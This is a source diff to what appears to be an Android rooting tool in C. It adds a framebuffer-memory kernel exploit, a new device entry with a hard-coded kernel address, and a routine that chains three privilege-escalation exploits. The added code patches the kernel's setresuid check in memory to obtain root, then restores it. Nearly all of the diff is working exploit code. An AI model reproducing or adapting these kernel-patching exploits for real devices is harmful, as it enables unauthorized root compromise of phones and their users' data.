@@ -27,6 +27,7 @@
 
 #include "libdiagexploit/diag.h"
 #include "perf_swevent.h"
+#include "libfb_mem_exploit/fb_mem.h"
 
 typedef struct _supported_device {
   const char *device;
@@ -44,6 +45,7 @@ static supported_device supported_devices[] = {
   { "IS17SH",           "01.00.03"  , 0xc01b82a4 },
   { "ISW11K",           "145.0.0002", 0xc010ae18 },
   { "URBANO PROGRESSO", "010.0.3000", 0xc0176d40 },
+  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0175db4 },
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
@@ -152,6 +154,37 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
   return (ret == 0);
 }
 
+static bool
+attempt_fb_mem_exploit(unsigned long int sys_setresuid_address)
+{
+  int ret;
+
+  printf("Attempt fb mem exploit...\n");
+
+  fb_mem_set_kernel_phys_offset(0x200000);
+
+  if (!fb_mem_write_value_at_address(sys_setresuid_address + 0x40, 0x0a000020)) {
+    return false;
+  }
+
+  ret = setresuid(0, 0, 0);
+  fb_mem_write_value_at_address(sys_setresuid_address + 0x40, 0x1a000020);
+
+  return (ret == 0);
+}
+
+static bool
+run_exploits(unsigned long int sys_setresuid_address)
+{
+  if (attempt_fb_mem_exploit(sys_setresuid_address))
+    return true;
+
+  if (attempt_perf_swevent_exploit(sys_setresuid_address))
+    return true;
+
+  return attempt_diag_exploit(sys_setresuid_address);
+}
+
 int
 main(int argc, char **argv)
 {
@@ -163,10 +196,7 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  success = attempt_perf_swevent_exploit(sys_setresuid_address);
-  if (!success) {
-    success = attempt_diag_exploit(sys_setresuid_address);
-  }
+  success = run_exploits(sys_setresuid_address);
 
   if (!success) {
     printf("failed to get root access\n");
